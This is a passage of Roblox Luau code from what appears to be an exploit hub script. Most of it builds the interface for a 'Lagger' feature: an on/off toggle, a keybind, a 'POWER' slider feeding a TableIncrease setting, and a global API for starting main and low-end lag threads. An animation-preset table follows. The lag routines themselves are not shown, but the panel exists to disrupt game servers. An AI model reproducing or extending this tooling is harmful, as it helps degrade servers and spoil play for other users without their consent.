	title.Font = Enum.Font.GothamBlack
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextSize = 16
	title.BackgroundTransparency = 1
	title.Position = UDim2.fromOffset(10, 0)
	title.Size = UDim2.fromOffset(62, 20)
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.ZIndex = 3
	title.Parent = headerFrame

	local laggerTitle = Instance.new("TextLabel")
	laggerTitle.Name = "LaggerLabel"
	laggerTitle.Text = ""
	laggerTitle.Font = Enum.Font.GothamBold
	laggerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	laggerTitle.TextSize = 13
	laggerTitle.BackgroundTransparency = 1
	laggerTitle.Position = UDim2.fromOffset(70, 1)
	laggerTitle.Size = UDim2.fromOffset(58, 18)
	laggerTitle.TextXAlignment = Enum.TextXAlignment.Left
	laggerTitle.ZIndex = 3
	laggerTitle.Parent = headerFrame

	title.AnchorPoint = Vector2.new(0.5, 0)
	title.Position = UDim2.new(0.5, 0, 0, 12)
	title.Size = UDim2.fromOffset(194, 26)
	_G.__UnoAddOriginalGui3Title(title, "Lagger")
	refreshLaggerThemeText = function()

	title.Visible = false
	end
	refreshLaggerThemeText()

	local closeButton = Instance.new("TextButton")
	closeButton.Name = "Close"
	closeButton.Text = "X"
	closeButton.Font = Enum.Font.GothamBold
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.TextSize = 14
	closeButton.BackgroundTransparency = 1
	closeButton.Size = UDim2.fromOffset(20, 20)
	closeButton.Position = UDim2.new(1, -20, 0, 0)
	closeButton.ZIndex = 3
	closeButton.Parent = headerFrame

	local minimizeButton = Instance.new("TextButton")
	minimizeButton.Name = "Minimize"
	minimizeButton.Text = "-"
	minimizeButton.Font = Enum.Font.GothamBlack
	minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	minimizeButton.TextSize = 16
	minimizeButton.BackgroundTransparency = 1
	minimizeButton.Size = UDim2.fromOffset(20, 20)
	minimizeButton.Position = UDim2.new(1, -44, 0, 0)
	minimizeButton.ZIndex = 3
	minimizeButton.Parent = headerFrame

	local minimizedToggleButton = Instance.new("TextButton")
	minimizedToggleButton.Name = "MinimizedToggle"
	minimizedToggleButton.Text = "LAG: OFF"
	minimizedToggleButton.Font = Enum.Font.GothamBold
	minimizedToggleButton.TextColor3 = Color3.fromRGB(235, 240, 245)
	minimizedToggleButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	minimizedToggleButton.TextStrokeTransparency = 1
	minimizedToggleButton.TextSize = 11
	minimizedToggleButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	minimizedToggleButton.BackgroundTransparency = 0.1
	minimizedToggleButton.BorderSizePixel = 0
	minimizedToggleButton.AutoButtonColor = false
	minimizedToggleButton.Size = UDim2.fromOffset(72, 22)
	minimizedToggleButton.Position = UDim2.new(1, -120, 0, -1)
	minimizedToggleButton.Visible = false
	minimizedToggleButton.ZIndex = 5
	minimizedToggleButton.Parent = headerFrame
	Instance.new("UICorner", minimizedToggleButton).CornerRadius = UDim.new(0, 7)
	local minimizedToggleStroke = Instance.new("UIStroke", minimizedToggleButton)
	minimizedToggleStroke.Color = Color3.fromRGB(0, 0, 0)
	minimizedToggleStroke.Thickness = 1

	local controlFrame = Instance.new("Frame")
	controlFrame.Name = "Controls"
	controlFrame.Size = UDim2.new(1, -12, 0, 35)
	controlFrame.Position = UDim2.fromOffset(6, 73)
	controlFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	controlFrame.BackgroundTransparency = 0.5
	controlFrame.BorderSizePixel = 0
	controlFrame.ZIndex = 2
	controlFrame.Parent = mainFrame
	Instance.new("UICorner", controlFrame).CornerRadius = UDim.new(0, 10)

	keybindButton = Instance.new("TextButton")
	keybindButton.Name = "KeybindButton"
	keybindButton.Size = UDim2.fromOffset(32, 27)
	keybindButton.Position = UDim2.new(0, 6, 0.5, -13.5)
	keybindButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	keybindButton.BackgroundTransparency = 0
	keybindButton.AutoButtonColor = false
	keybindButton.Font = Enum.Font.GothamBold
	keybindButton.Text = keyName(boundKey)
	keybindButton.TextColor3 = WHITE
	keybindButton.TextSize = 10
	keybindButton.ZIndex = 3
	keybindButton.Parent = controlFrame
	Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 6)
	keybindStroke = Instance.new("UIStroke", keybindButton)
	keybindStroke.Color = Color3.fromRGB(50, 50, 50)
	keybindStroke.Thickness = 1
	keybindStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	local toggleLabel = Instance.new("TextLabel")
	toggleLabel.Name = "Status"
	toggleLabel.Text = "LAGGER: OFF"
	toggleLabel.Font = Enum.Font.GothamBold
	toggleLabel.TextColor3 = WHITE
	toggleLabel.TextSize = 9
	toggleLabel.BackgroundTransparency = 1
	toggleLabel.Position = UDim2.fromScale(0, 0)
	toggleLabel.Size = UDim2.fromScale(1, 1)
	toggleLabel.TextXAlignment = Enum.TextXAlignment.Center
	toggleLabel.ZIndex = 3
	toggleLabel.Parent = controlFrame

	local switchBackground = Instance.new("Frame")
	switchBackground.Name = "Switch"
	switchBackground.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	switchBackground.BorderSizePixel = 0
	switchBackground.Size = UDim2.fromOffset(32, 18)
	switchBackground.Position = UDim2.new(1, -38, 0.5, -9)
	switchBackground.ZIndex = 3
	switchBackground.Parent = controlFrame
	Instance.new("UICorner", switchBackground).CornerRadius = UDim.new(1, 0)

	local toggleKnob = Instance.new("Frame")
	toggleKnob.Name = "Knob"
	toggleKnob.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	toggleKnob.BorderSizePixel = 0
	toggleKnob.Size = UDim2.fromOffset(12, 12)
	toggleKnob.Position = UDim2.new(0, 3, 0.5, -6)
	toggleKnob.ZIndex = 4
	toggleKnob.Parent = switchBackground
	Instance.new("UICorner", toggleKnob).CornerRadius = UDim.new(1, 0)

	local toggleButton = Instance.new("TextButton")
	toggleButton.Name = "ToggleButton"
	toggleButton.Text = ""
	toggleButton.BackgroundTransparency = 1

	toggleButton.Position = UDim2.fromOffset(44, 0)
	toggleButton.Size = UDim2.new(1, -44, 1, 0)
	toggleButton.ZIndex = 5
	toggleButton.Parent = controlFrame
	local themesFrame = nil

	local powerFrame = Instance.new("Frame")
	powerFrame.Name = "PowerControl"
	powerFrame.Size = UDim2.new(1, -12, 0, 43)
	powerFrame.Position = UDim2.fromOffset(6, 80)
	powerFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	powerFrame.BackgroundTransparency = 0.5
	powerFrame.BorderSizePixel = 0
	powerFrame.ZIndex = 2
	powerFrame.Parent = mainFrame
	powerFrame.Visible = false
	Instance.new("UICorner", powerFrame).CornerRadius = UDim.new(0, 10)

	local powerLabel = Instance.new("TextLabel")
	powerLabel.Name = "PowerValue"
	powerLabel.Size = UDim2.new(1, -12, 0, 16)
	powerLabel.Position = UDim2.fromOffset(6, 2)
	powerLabel.BackgroundTransparency = 1
	powerLabel.Font = Enum.Font.GothamBold
	powerLabel.TextColor3 = WHITE
	powerLabel.TextSize = 10
	powerLabel.TextXAlignment = Enum.TextXAlignment.Left
	powerLabel.ZIndex = 3
	powerLabel.Parent = powerFrame

	local powerBar = Instance.new("Frame")
	powerBar.Name = "Bar"
	powerBar.Size = UDim2.new(1, -12, 0, 8)
	powerBar.Position = UDim2.new(0, 6, 1, -15)
	powerBar.BackgroundColor3 = Color3.fromRGB(42, 42, 48)
	powerBar.BorderSizePixel = 0
	powerBar.ZIndex = 3
	powerBar.Parent = powerFrame
	Instance.new("UICorner", powerBar).CornerRadius = UDim.new(1, 0)

	local powerFill = Instance.new("Frame")
	powerFill.Name = "Fill"
	powerFill.Size = UDim2.fromScale(0, 1)
	powerFill.BackgroundColor3 = Color3.fromRGB(235, 240, 245)
	powerFill.BorderSizePixel = 0
	powerFill.ZIndex = 4
	powerFill.Parent = powerBar
	Instance.new("UICorner", powerFill).CornerRadius = UDim.new(1, 0)

	local powerKnob = Instance.new("Frame")
	powerKnob.Name = "Knob"
	powerKnob.AnchorPoint = Vector2.new(0.5, 0.5)
	powerKnob.Size = UDim2.fromOffset(14, 14)
	powerKnob.Position = UDim2.new(0, 0, 0.5, 0)
	powerKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	powerKnob.BorderSizePixel = 0
	powerKnob.ZIndex = 5
	powerKnob.Parent = powerBar
	Instance.new("UICorner", powerKnob).CornerRadius = UDim.new(1, 0)

	local powerHitbox = Instance.new("TextButton")
	powerHitbox.Name = "PowerSlider"
	powerHitbox.Size = UDim2.new(1, 12, 0, 24)
	powerHitbox.Position = UDim2.new(0, -6, 0.5, -12)
	powerHitbox.BackgroundTransparency = 1
	powerHitbox.Text = ""
	powerHitbox.Active = true
	powerHitbox.ZIndex = 6
	powerHitbox.Parent = powerBar

	local powerSliderDragging = false
	local function setLaggerPower(value, persist)
	value = math.clamp(math.floor((tonumber(value) or 0) + 0.5), 0, LAGGER_POWER_MAX)
	LAGGER_CONFIG.TableIncrease = value
	local ratio = value / LAGGER_POWER_MAX
	powerFill.Size = UDim2.fromScale(ratio, 1)
	powerKnob.Position = UDim2.new(ratio, 0, 0.5, 0)
	powerLabel.Text = "POWER: " .. tostring(value)
	if persist then saveSettings() end
	end
	local function updatePowerFromInput(input)
	local width = powerBar.AbsoluteSize.X
	if width <= 0 then return end
	local ratio = math.clamp((input.Position.X - powerBar.AbsolutePosition.X) / width, 0, 1)
	setLaggerPower(ratio * LAGGER_POWER_MAX, false)
	end
	setLaggerPower(LAGGER_CONFIG.TableIncrease, false)
	powerHitbox.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	powerSliderDragging = true
	updatePowerFromInput(input)
	end
	end)
	_G.__UnoTrackConn(UserInputService.InputChanged:Connect((function(input)
	if powerSliderDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
	updatePowerFromInput(input)
	end
	end)))
	_G.__UnoTrackConn(UserInputService.InputEnded:Connect(function(input)
	if powerSliderDragging and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
	powerSliderDragging = false
	setLaggerPower(LAGGER_CONFIG.TableIncrease, true)
	end
	end))

	keybindButton.Activated:Connect(function()
	if waitingForKey then return end
	waitingForKey = true
	keybindButton.Text = "..."
	keybindButton.TextColor3 = WHITE
	keybindButton.BackgroundTransparency = 0.6
		if keybindStroke then keybindStroke.Color = Color3.fromRGB(0, 0, 0) end
	keyConn = UserInputService.InputBegan:Connect(function(input)
	if not waitingForKey then return end
	local keyboardInput = input.UserInputType == Enum.UserInputType.Keyboard
	local gamepadInput = isGamepadInput(input)
	if keyboardInput or gamepadInput then
	if input.KeyCode == Enum.KeyCode.Unknown then return end
	if keyboardInput and input.KeyCode == Enum.KeyCode.Escape then
	stopListening()
	return
	end
	boundKey = input.KeyCode
	waitingForKey = false
	keybindJustSet = true
	if keyConn then keyConn:Disconnect(); keyConn = nil end
	updateKeybindDisplay()
	saveSettings()
	task.delay(0.3, function() keybindJustSet = false end)
	end
	end)
	task.delay(5, function()
	if waitingForKey then stopListening() end
	end)
	end)

	local function setToggleVisual(active, animated)
	local knobPosition = active and UDim2.new(1, -17, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
	if animated then
	TweenService:Create(toggleKnob, TweenInfo.new(0.15), { Position = knobPosition }):Play()
	else
	toggleKnob.Position = knobPosition
	end
	toggleLabel.Text = active and "LAGGER: ON" or "LAGGER: OFF"
	minimizedToggleButton.Text = active and "LAG: ON" or "LAG: OFF"
	minimizedToggleButton.BackgroundColor3 = active and Color3.fromRGB(205, 210, 215) or Color3.fromRGB(35, 35, 35)
	minimizedToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	end

	toggleButton.MouseButton1Click:Connect(function()
	local newState = toggleMainLagger()
	setToggleVisual(newState, true)
	saveSettings()
	end)
	minimizedToggleButton.Activated:Connect(function()
	local newState = toggleMainLagger()
	setToggleVisual(newState, true)
	saveSettings()
	end)

	closeButton.MouseButton1Click:Connect(function()
	mainFrame.Visible = false
	laggerToggled = false
	updateLaggerVisual()
	saveSettings()
	end)

	local originalSize = UDim2.fromOffset(270, 116)
	local minimizedSize = UDim2.fromOffset(270, 30)
	local function applyLaggerMinimized(minimized, animated)
	laggerMinimized = minimized == true
	minimizeButton.Text = laggerMinimized and "+" or "-"
	minimizedToggleButton.Visible = laggerMinimized
	controlFrame.Visible = not laggerMinimized
	powerFrame.Visible = false
	local targetSize = laggerMinimized and minimizedSize or originalSize
	if animated then
	TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = targetSize}):Play()
	else
	mainFrame.Size = targetSize
	end
	end
	minimizeButton.Activated:Connect(function()
	applyLaggerMinimized(not laggerMinimized, true)
	saveSettings()
	end)

	_G.__UnoTrackConn(UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if waitingForKey then return end
	if keybindJustSet then return end
	local gamepadInput = isGamepadInput(input)
	if gameProcessed and not gamepadInput then return end
	if input.UserInputType ~= Enum.UserInputType.Keyboard and not gamepadInput then return end
	if input.KeyCode ~= boundKey then return end
	local newState = toggleMainLagger()
	setToggleVisual(newState, true)
	saveSettings()
	end))

	local dragSaveGen = 0
	mainFrame:GetPropertyChangedSignal("Position"):Connect(function()
	dragSaveGen += 1
	local thisGen = dragSaveGen
	task.delay(0.3, function()
	if thisGen == dragSaveGen then saveSettings() end
	end)
	end)

	local dragging = false
	local dragStart, startPosition
	mainFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
	dragging = true
	dragStart = input.Position
	startPosition = mainFrame.Position
	end
	end)
	_G.__UnoTrackConn(UserInputService.InputChanged:Connect((function(input)
	if not dragging then return end
	if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
	local delta = input.Position - dragStart
	mainFrame.Position = UDim2.new(startPosition.X.Scale, startPosition.X.Offset + delta.X, startPosition.Y.Scale, startPosition.Y.Offset + delta.Y)
	end)))
	_G.__UnoTrackConn(UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
	end))

	local function applySavedSettings()
	local data = loadSettings()
	if not data then
	setToggleVisual(false, false)
	updateKeybindDisplay()
	mainFrame.Visible = openPanel == true
	laggerToggled = mainFrame.Visible
	updateLaggerVisual()
	saveSettings()
	return
	end
	if data.keybind then
	local kc = Enum.KeyCode[data.keybind]
	if kc then boundKey = kc end
	end
	if data.power ~= nil then
	local savedPower = tonumber(data.power)

	if data.engineVersion ~= "legacy" and savedPower == 90 then savedPower = 270 end
	setLaggerPower(savedPower or LAGGER_CONFIG.TableIncrease, false)
	end
	updateKeybindDisplay()
	if data.mainEnabled ~= nil then

	laggerStates.Main = data.mainEnabled == true and not isMobile
	if laggerStates.Main then startMainLag() end
	setToggleVisual(laggerStates.Main, false)
	end
	if data.lowEndEnabled ~= nil then
	laggerStates.LowEnd = data.lowEndEnabled == true and not isMobile
	if laggerStates.LowEnd then startLowEndLag() end
	end
	if data.background then
	currentBackground = 1
	bgImage.Image = BACKGROUNDS[currentBackground]
	_G.__UnoFramePanelBackground(bgImage, currentBackground, "Lagger")
	mainStroke.Transparency = currentBackground == 1 and 1 or 0
	end
	if refreshLaggerThemeText then refreshLaggerThemeText() end
	if data.position and not _G.__UnoGuiPositionsReset then
	pcall(function()
	mainFrame.Position = UDim2.new(data.position.xScale, data.position.xOffset, data.position.yScale, data.position.yOffset)
	end)
	end
	applyLaggerMinimized(data.minimized == true, false)
	if data.visible ~= nil then
	mainFrame.Visible = openPanel == true and true or data.visible and true or false
	else
	mainFrame.Visible = openPanel == true
	end
	laggerToggled = mainFrame.Visible
	updateLaggerVisual()
	saveSettings()
	end
	for _, descendant in ipairs(screenGui:GetDescendants()) do
	if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
	descendant:SetAttribute("UnoKeepBlackText", true)
	descendant.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	descendant.TextStrokeTransparency = 0.2
	end
	end
	if refreshLaggerThemeText then refreshLaggerThemeText() end
	applySavedSettings()

	currentBackground = 1
	bgImage.Image = BACKGROUNDS[currentBackground]
	_G.__UnoFramePanelBackground(bgImage, currentBackground, "Lagger")
	mainStroke.Transparency = currentBackground == 1 and 1 or 0
	if refreshLaggerThemeText then refreshLaggerThemeText() end
	saveSettings()

	_G.UnoLagger = {
	Stop = function()
	stopAllLaggerThreads()
	end,
	ResetPosition = function()
	dragging = false
	mainFrame.Position = UDim2.new(0.5, -135, 0.5, -58)
	saveSettings()
	end,
	IsEnabled = function() return laggerStates.Main end,
	IsLowEndEnabled = function() return laggerStates.LowEnd end,
	Toggle = function()
	local newState = toggleMainLagger()
	setToggleVisual(newState, true)
	saveSettings()
	return newState
	end,
	ToggleLowEnd = function()
	local newState = toggleLowEndLagger()
	saveSettings()
	return newState
	end,
	SetEnabled = function(enabled)
	if laggerStates.Main ~= enabled then
	laggerStates.Main = enabled
	if enabled then
	if laggerStates.LowEnd then
	laggerStates.LowEnd = false
	stopThread("LowEnd")
	end
	startMainLag()
	else
	stopThread("Main")
	end
	setToggleVisual(laggerStates.Main, true)
	saveSettings()
	end
	end,
	SetLowEndEnabled = function(enabled)
	if laggerStates.LowEnd ~= enabled then
	laggerStates.LowEnd = enabled
	if enabled then
	if laggerStates.Main then
	laggerStates.Main = false
	stopThread("Main")
	setToggleVisual(false, true)
	end
	startLowEndLag()
	else
	stopThread("LowEnd")
	end
	saveSettings()
	end
	end,
	GetPower = function() return LAGGER_CONFIG.TableIncrease end,
	SetPower = function(power)
	setLaggerPower(power, true)
	end,
	GetKeybind = function() return boundKey end,
	SetKeybind = function(key)
	local kc = nil
	if typeof(key) == "string" then
	kc = Enum.KeyCode[key]
	elseif typeof(key) == "EnumItem" and key.EnumType == Enum.KeyCode then
	kc = key
	end
	if kc then
	boundKey = kc
	updateKeybindDisplay()
	saveSettings()
	end
	end,
	SetBackground = function(index)
	currentBackground = 1
	bgImage.Image = BACKGROUNDS[currentBackground]
	_G.__UnoFramePanelBackground(bgImage, currentBackground, "Lagger")
	mainStroke.Transparency = currentBackground == 1 and 1 or 0
	if refreshLaggerThemeText then refreshLaggerThemeText() end
	saveSettings()
	end,
	GetBackground = function() return currentBackground end,
	SetVisible = function(visible)
	if mainFrame then
	local isVisible = visible and true or false
	mainFrame.Visible = isVisible
	laggerToggled = isVisible
	updateLaggerVisual()
	if not isVisible and themesFrame then themesFrame.Visible = false end
	saveSettings()
	end
	end,
	SaveSettings = function()
	saveSettings()
	end,
	}
	end)
	end)
	end

	_G.__openLaggerGUI = openLaggerGUI

	local function closeLaggerGUI()
	laggerToggled = false
	updateLaggerVisual()
	if _G.UnoLagger and _G.UnoLagger.SetVisible then
	_G.UnoLagger.SetVisible(false)
	end
	if _G.UnoLagger and _G.UnoLagger.SaveSettings then
	_G.UnoLagger.SaveSettings()
	end
	end

	connectBtn(laggerBtn, function()
	laggerToggled = not laggerToggled
	updateLaggerVisual()

	if laggerToggled then
	if _G._UnoLaggerGUILoaded then
	if _G.UnoLagger and _G.UnoLagger.SetVisible then
	_G.UnoLagger.SetVisible(true)
	end
	if _G.UnoLagger and _G.UnoLagger.SaveSettings then
	_G.UnoLagger.SaveSettings()
	end
	else
	openLaggerGUI(true)
	end
	else
	closeLaggerGUI()
	end
	end)

	do
	local laggerHasSavedState, laggerSavedVisible = _G.__UnoReadSavedPanelVisibility("UnoLagger_Settings.json")
	laggerToggled = laggerHasSavedState and laggerSavedVisible or false
	updateLaggerVisual()
	if laggerHasSavedState then openLaggerGUI(false) end
	end

	_G.__UnoReadSavedPanelVisibility = nil

	local toggleUiRow = Instance.new("Frame", panelsPanel)
	toggleUiRow.Size = UDim2.new(1, -18, 0, 28)
	toggleUiRow.Position = UDim2.new(0, 9, 0, 68)
	toggleUiRow.BackgroundTransparency = 1
	toggleUiRow.Visible = true
	local toggleUiLabel = Instance.new("TextLabel", toggleUiRow)
	toggleUiLabel.Size = UDim2.new(1, -50, 0, 32)
	toggleUiLabel.Position = UDim2.new(0, 0, 0, 2)
	toggleUiLabel.BackgroundTransparency = 1
	toggleUiLabel.Text = "Toggle UI"
	toggleUiLabel.TextColor3 = Color3.fromRGB(40, 80, 150)
	toggleUiLabel.TextSize = 10
	toggleUiLabel.Font = Enum.Font.GothamBold
	toggleUiLabel.TextXAlignment = Enum.TextXAlignment.Left
	toggleUiLabel.TextYAlignment = Enum.TextYAlignment.Center

	local toggleUiBindBtn = Instance.new("TextButton", toggleUiRow)
	toggleUiBindBtn.Size = UDim2.new(0, 40, 0, 20)
	toggleUiBindBtn.Position = UDim2.new(1, -48, 0.5, -10)
	toggleUiBindBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	toggleUiBindBtn.BackgroundTransparency = 0.15
	toggleUiBindBtn.BorderSizePixel = 0
	toggleUiBindBtn.Text = FeatureKeybinds["Toggle UI"] and keybindDisplayName(FeatureKeybinds["Toggle UI"]) or "-"
	toggleUiBindBtn.TextColor3 = Color3.fromRGB(225,238,255)
	toggleUiBindBtn.TextSize = 9
	toggleUiBindBtn.Font = Enum.Font.GothamBold
	toggleUiBindBtn.AutoButtonColor = false
	Instance.new("UICorner", toggleUiBindBtn).CornerRadius = UDim.new(0, 4)
	local toggleUiStroke = Instance.new("UIStroke", toggleUiBindBtn)
	toggleUiStroke.Color = Color3.fromRGB(255,255,255)
	toggleUiStroke.Thickness = 1
	toggleUiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

	connectBtn(toggleUiBindBtn, function()
	if listeningBindBtn then
	listeningBindBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
	listeningBindBtn.BackgroundTransparency = 1
	listeningBindBtn.Text = "-"
	end
	listeningBindBtn = toggleUiBindBtn
	listeningFeature = "Toggle UI"
	toggleUiBindBtn.Text = "..."
	toggleUiBindBtn.BackgroundColor3 = Color3.fromRGB(4, 18, 42)
	toggleUiBindBtn.BackgroundTransparency = 0
	end)

	table.insert(_allBindBtns, toggleUiBindBtn)
	if toggleVisualUpdaters["Toggle UI"] == nil then
	toggleVisualUpdaters["Toggle UI"] = function()
	toggleUiBindBtn.Text = FeatureKeybinds["Toggle UI"] and keybindDisplayName(FeatureKeybinds["Toggle UI"]) or "-"
	toggleUiBindBtn.BackgroundColor3 = Color3.fromRGB(30,30,38)
	toggleUiBindBtn.BackgroundTransparency = 0.15
	toggleUiBindBtn.TextColor3 = Color3.fromRGB(225,238,255)
	end
	end

	end

	local animationsSection = makeUraniumSection(tabPages.Visuals, "ANIMATIONS")
	local animationPresetOrder = {
	"Adidas Sports",
	"Adidas Community",
	"Adidas Aura",
	"Wicked Popular",
	"Elder",
	"Zombie",
	"Mage",
	"Catwalk Glam",
	"Astronaut",
	'Wicked "Dancing Through Life"',
	"Werewolf",
	"Superhero",
	"Toy",
	"No Boundaries",
	"NFL",
	"Amazon Unboxed",
	"Vampire",
	"Ninja",
	"Robot",
	"Levitation",
	"Stylish",
	"Bubbly",
	"Cartoon",
	}
	local animationPresets = {
	["Adidas Sports"]               = {WalkAnim=18537392113, RunAnim=18537384940, JumpAnim=18537380791, FallAnim=18537367238, SwimIdle=18537387180, Swim=18537389531, Animation1=18537376492, Animation2=18537371272, ClimbAnim=18537363391},
	["Adidas Community"]            = {WalkAnim=122150855457006, RunAnim=82598234841035, JumpAnim=75290611992385, FallAnim=98600215928904, SwimIdle=109346520324160, Swim=133308483266208, Animation1=122257458498464, Animation2=102357151005774, ClimbAnim=88763136693023},
	["Adidas Aura"]                 = {WalkAnim=83842218823011, RunAnim=118320322718866, JumpAnim=109996626521204, FallAnim=95603166884636, SwimIdle=94922130551805, Swim=134530128383903, Animation1=110211186840347, Animation2=114191137265065, ClimbAnim=97824616490448},
	["Wicked Popular"]              = {WalkAnim=92072849924640, RunAnim=72301599441680, JumpAnim=104325245285198, FallAnim=121152442762481, Animation1=118832222982049, ClimbAnim=131326830509784, SwimIdle=113199415118199, Swim=99384245425157, Animation2=76049494037641},
	["Elder"]                       = {WalkAnim=10921111375, RunAnim=10921104374, JumpAnim=10921107367, FallAnim=10921105765, SwimIdle=10921110146, Swim=10921108971, ClimbAnim=10921100400, Animation1=10921101664, Animation2=10921102574},
	["Zombie"]                      = {WalkAnim=10921355261, RunAnim=616163682, JumpAnim=10921351278, FallAnim=10921350320, SwimIdle=10921353442, Swim=10921352344, Animation1=10921344533, Animation2=10921345304, ClimbAnim=10921343576},
	["Mage"]                        = {WalkAnim=10921152678, RunAnim=10921148209, JumpAnim=10921149743, FallAnim=10921148939, SwimIdle=10921151661, Swim=10921150788, ClimbAnim=10921143404, Animation1=10921144709, Animation2=10921145797},
	["Catwalk Glam"]                = {WalkAnim=109168724482748, RunAnim=81024476153754, JumpAnim=116936326516985, FallAnim=92294537340807, SwimIdle=98854111361360, Swim=134591743181628, ClimbAnim=119377220967554, Animation1=133806214992291, Animation2=94970088341563},
	["Astronaut"]                   = {WalkAnim=10921046031, RunAnim=10921039308, JumpAnim=10921042494, FallAnim=10921040576, SwimIdle=10921045006, Swim=10921044000, ClimbAnim=10921032124, Animation1=10921034824, Animation2=10921036806},
	["Wicked \"Dancing Through Life\""] = {WalkAnim=73718308412641, RunAnim=135515454877967, JumpAnim=78508480717326, FallAnim=78147885297412, SwimIdle=129183123083281, Swim=110657013921774, ClimbAnim=129447497744818, Animation1=92849173543269, Animation2=132238900951109},
	["Werewolf"]                    = {WalkAnim=10921342074, RunAnim=10921336997, FallAnim=10921337907, SwimIdle=10921341319, Swim=10921340419, ClimbAnim=10921329322, Animation1=10921330408, Animation2=10921333667},
	["Superhero"]                   = {WalkAnim=10921298616, RunAnim=10921291831, JumpAnim=10921294559, FallAnim=10921293373, SwimIdle=10921297391, Swim=10921295495, ClimbAnim=10921286911, Animation1=10921288909, Animation2=10921290167},
	["Toy"]                         = {WalkAnim=10921312010, RunAnim=10921306285, JumpAnim=10921308158, FallAnim=10921307241, SwimIdle=10921310341, Swim=10921309319, ClimbAnim=10921300839, Animation1=10921301576},
	["No Boundaries"]               = {WalkAnim=18747074203, RunAnim=18747070484, JumpAnim=18747069148, FallAnim=18747062535, SwimIdle=18747071682, Swim=18747073181, ClimbAnim=18747060903, Animation1=18747067405, Animation2=18747063918},
	["NFL"]                         = {WalkAnim=110358958299415, RunAnim=117333533048078, JumpAnim=119846112151352, FallAnim=129773241321032, SwimIdle=79090109939093, Swim=132697394189921, ClimbAnim=134630013742019, Animation1=92080889861410, Animation2=74451233229259},
	["Amazon Unboxed"]              = {WalkAnim=90478085024465, RunAnim=134824450619865, JumpAnim=121454505477205, FallAnim=94788218468396, SwimIdle=129126268464847, Swim=105962919001086, ClimbAnim=121145883950231, Animation1=98281136301627},
	["Vampire"]                     = {WalkAnim=10921326949, RunAnim=10921320299, JumpAnim=10921322186, FallAnim=10921321317, SwimIdle=10921325443, Swim=10921324408, ClimbAnim=10921314188, Animation1=10921315373},
	["Ninja"]                       = {RunAnim=656118852, WalkAnim=656121766, JumpAnim=656117878, FallAnim=656115606, Swim=656119721, SwimIdle=656121397, ClimbAnim=656114359, Idle={656117400,656118341,886742569}},
	["Robot"]                       = {RunAnim=616091570, WalkAnim=616095330, JumpAnim=616090535, FallAnim=616087089, Swim=616092998, SwimIdle=616094091, ClimbAnim=616086039, Idle={616088211,616089559,885531463}},
	["Levitation"]                  = {RunAnim=616010382, WalkAnim=616013216, JumpAnim=616008936, FallAnim=616005863, Swim=616011509, SwimIdle=616012453, ClimbAnim=616003713, Idle={616006778,616008087,886862142}},
	["Stylish"]                     = {RunAnim=616140816, WalkAnim=616146177, JumpAnim=616139451, FallAnim=616134815, Swim=616143378, SwimIdle=616144772, ClimbAnim=616133594, Idle={616136790,616138447,886888594}},
	["Bubbly"]                      = {RunAnim=910025107, WalkAnim=910034870, JumpAnim=910016857, FallAnim=910001910, Swim=910028158, SwimIdle=910030921, ClimbAnim=909997997, Idle={910004836,910009958,1018536639}},
	["Cartoon"]                     = {RunAnim=742638842, WalkAnim=742640026, JumpAnim=742637942, FallAnim=742637151, Swim=742639220, SwimIdle=742639812, ClimbAnim=742636889, Idle={742637544,742638445,885477856}},
	}
	local animationPropertyOrder = {"idle1", "idle2", "walk", "run", "jump", "fall", "climb", "swim", "swimidle"}
	local animationPropertyLabels = {
	idle1 = "Idle 1",
	idle2 = "Idle 2",
	walk = "Walk",
	run = "Run",
	jump = "Jump",
	fall = "Fall",
	climb = "Climb",
	swim = "Swim",
	swimidle = "Swim Idle",
	}
	local function normalizeAnimValue(value)
	if not value then return nil end
	if type(value) == "number" then
	return "rbxassetid://" .. tostring(value)
	end
	if type(value) == "string" then
	local trimmed = string.gsub(value, "^%s+", "")
	trimmed = string.gsub(trimmed, "%s+$", "")
	if trimmed == "" then return nil end
	if string.sub(trimmed, 1, 11) == "rbxassetid://" then return trimmed end
	if string.match(trimmed, "^%d+$") then return "rbxassetid://" .. trimmed end
	return trimmed
	end
	return nil
	end
	local function buildAnimPackFromPreset(preset)
	local idle = preset and preset.Idle
	return {
	idle1 = normalizeAnimValue(preset and (preset.Animation1 or (idle and idle[1]))),
	idle2 = normalizeAnimValue(preset and (preset.Animation2 or (idle and idle[2]))),
	walk = normalizeAnimValue(preset and (preset.WalkAnim or preset.Walk)),
